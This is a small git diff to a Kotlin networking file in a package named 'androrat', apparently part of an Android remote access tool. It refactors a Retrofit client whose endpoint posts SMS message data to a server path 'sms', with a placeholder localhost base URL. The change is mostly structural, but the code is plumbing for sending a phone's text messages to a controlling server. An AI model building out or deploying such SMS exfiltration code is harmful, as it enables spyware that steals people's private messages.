@@ -1,5 +1,6 @@
 package com.ierusalem.androrat.core.data.networking
 
+import android.content.Context
 import okhttp3.MultipartBody
 import okhttp3.ResponseBody
 import retrofit2.Response
@@ -18,18 +19,14 @@ interface ApiService {
     ): Response<ResponseBody>
 
     @POST("sms")
-    suspend fun uploadSMS(
-        @Body smsList: List<SMSModel>
-    ): Response<ResponseBody>
-
-    @POST("sms")
-    suspend fun uploadSMS(
+    suspend fun postMessages(
         @Body sms: SMSModel
     ): Response<ResponseBody>
 }
 
-object RetrofitInstance {
-    private const val BASE_URL = "http://127.0.0"
+class RetrofitInstance(context: Context) {
+    
+    private val BASE_URL = "http://127.0.0"
 
     private val retrofit by lazy {
         Retrofit.Builder()
@@ -41,8 +38,4 @@ object RetrofitInstance {
     val api: ApiService by lazy {
         retrofit.create(ApiService::class.java)
     }
-}
-
-operator fun ApiService.invoke(): ApiService {
-    return this
 }
